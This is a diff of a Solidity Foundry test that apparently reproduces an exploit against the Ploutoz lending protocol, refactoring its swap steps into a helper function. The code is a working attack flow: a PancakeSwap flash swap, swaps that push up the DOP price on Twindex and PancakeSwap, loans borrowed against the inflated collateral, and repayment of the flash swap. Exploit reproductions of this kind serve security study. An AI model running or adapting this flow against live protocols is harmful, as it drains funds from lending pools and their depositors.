@@ -69,7 +69,6 @@ contract Ploutoz is BaseTestWithBalanceLog {
     }
 
     function testExploit() public balanceLog {
-        // vm.startPrank(0xCD8206410b55e278A9538071A69Ef9E185856D24);
         uint256 _amount0Out = 0;
         uint256 _amount1Out = 1_000_400.0 ether;
         IUniswapV2Pair(PancakeSwap).swap(_amount0Out, _amount1Out, address(this), "X");
@@ -86,33 +85,15 @@ contract Ploutoz is BaseTestWithBalanceLog {
     }
 
     function pancakeCall(address sender, uint256 amount0Out, uint256 amount1Out, bytes memory data) external {
-        // vm.startPrank(0xCD8206410b55e278A9538071A69Ef9E185856D24);
-        uint256 amountIn;
-        uint256 amountOutMin = 0;
-        address[] memory path = new address[](2);
-        uint256 deadline = block.timestamp;
-
-        amountIn = 1_000_000 ether;
-        path[0] = BUSD;
-        path[1] = DOP;
-        Uni_Router_V2(TwindexSwapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
-
-        amountIn = 400 ether;
-        path[0] = BUSD;
-        path[1] = DOP;
-        Uni_Router_V2(PancakeRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
+        swapTokenToToken(BUSD, DOP, 1_000_000 ether, TwindexSwapRouter);
+        swapTokenToToken(BUSD, DOP, 400 ether, PancakeRouter);
 
         //Here we borrow the assets
         borrowMultipleLoans();
-
-        amountIn = 570_625_638_619_593_832_545_805;
-        path[0] = DOP;
-        path[1] = BUSD;
-        Uni_Router_V2(TwindexSwapRouter).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
+        swapTokenToToken(DOP, BUSD, 570_625_638_619_593_832_545_805, TwindexSwapRouter);
 
         uint256 amount = 1_002_951.02 ether;
         IERC20(BUSD).transfer(PancakeSwap, amount);
-        // vm.stopPrank();
     }
 
     function borrowMultipleLoans() internal {
@@ -138,11 +119,16 @@ contract Ploutoz is BaseTestWithBalanceLog {
     function swapLoanedTokenToStable(address lToken) internal {
         address assetIn = ILoanToken(lToken).loanTokenAddress();
         uint256 amountIn = TokenHelper.getTokenBalance(assetIn, address(this));
+        swapTokenToToken(assetIn, BUSD, amountIn, PancakeRouter);
+    }
+
+    function swapTokenToToken(address tokenIn, address tokenOut, uint256 amountIn, address router) internal {
+        if (amountIn == 0) return;
+        IERC20(tokenIn).approve(router, type(uint256).max);
         address[] memory path = new address[](2);
-        path[0] = assetIn;
-        path[1] = BUSD;
-        IERC20(assetIn).approve(PancakeRouter, type(uint256).max);
-        Uni_Router_V2(PancakeRouter).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
+        path[0] = tokenIn;
+        path[1] = tokenOut;
+        Uni_Router_V2(router).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
     }
 
     function borrowSingleLoan(address token, uint256 withdrawAmount, uint256 collateralTokenSent) internal {
